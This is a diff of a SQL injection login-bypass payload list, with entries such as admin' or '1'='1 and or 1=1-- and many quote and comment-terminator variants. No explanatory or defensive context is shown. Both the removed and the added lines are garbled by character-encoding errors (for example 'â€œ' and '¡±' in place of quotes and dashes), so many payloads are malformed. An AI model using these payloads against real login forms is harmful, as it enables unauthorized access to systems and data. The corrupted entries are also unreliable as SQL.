@@ -25,42 +25,42 @@ or 'a'='a'
 or 1=1--
 or1=1--
 or 1=1
-or 1=1¨C
+or 1=1â€“
 or 1=1#
 or 1=1/*
-admin¡± or ¡°1¡±=¡±1¡å¨C
-admin¡± or ¡°1¡±=¡±1¡å#
-admin¡± or ¡°1¡±=¡±1¡å/*
-admin¡±or 1=1 or ¡°¡±=¡±
-admin¡± or 1=1
-admin¡± or 1=1¨C
-admin¡± or 1=1#
-admin¡± or 1=1/*
-admin¡±) or (¡°1¡å=¡±1
-admin¡±) or (¡°1¡å=¡±1¡±¨C
-admin¡±) or (¡°1¡å=¡±1¡å#
-admin¡±) or (¡°1¡å=¡±1¡å/*
-admin¡±) or ¡°1¡±=¡±1
-admin¡±) or ¡°1¡±=¡±1¡å¨C
-admin¡±) or ¡°1¡±=¡±1¡å#
-admin¡±) or ¡°1¡±=¡±1¡å/*
-admin¡¯ ¡ª
-admin¡¯ #
-admin¡¯/*
-admin¡¯ or ¡®1¡¯=¡¯1
-admin¡¯ or ¡®1¡¯=¡¯1¡ä¨C
-admin¡¯ or ¡®1¡¯=¡¯1¡¯#
-admin¡¯ or ¡®1¡¯=¡¯1¡¯/*
-admin¡¯or 1=1 or ¡±=¡¯
-admin¡¯ or 1=1
-admin¡¯ or 1=1¨C
-admin¡¯ or 1=1#
-admin¡¯ or 1=1/*
-admin¡¯) or (¡®1¡¯=¡¯1
-admin¡¯) or (¡®1¡¯=¡¯1¡¯¨C
-admin¡¯) or (¡®1¡¯=¡¯1¡¯#
-admin¡¯) or (¡®1¡¯=¡¯1¡¯/*
-admin¡¯) or ¡®1¡¯=¡¯1
-admin¡¯) or ¡®1¡¯=¡¯1¡ä¨C
-admin¡¯) or ¡®1¡¯=¡¯1¡¯#
-admin¡¯) or ¡®1¡¯=¡¯1¡¯/*
+admin'' or â€œ1''=''1â€³â€“
+admin'' or â€œ1''=''1â€³#
+admin'' or â€œ1''=''1â€³/*
+admin''or 1=1 or â€œ''=''
+admin'' or 1=1
+admin'' or 1=1â€“
+admin'' or 1=1#
+admin'' or 1=1/*
+admin'') or (â€œ1â€³=''1
+admin'') or (â€œ1â€³=''1''â€“
+admin'') or (â€œ1â€³=''1â€³#
+admin'') or (â€œ1â€³=''1â€³/*
+admin'') or â€œ1''=''1
+admin'') or â€œ1''=''1â€³â€“
+admin'') or â€œ1''=''1â€³#
+admin'') or â€œ1''=''1â€³/*
+admin' â€”
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1â€²â€“
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1â€“
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'â€“
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1â€²â€“
+admin') or '1'='1'#
+admin') or '1'='1'/*
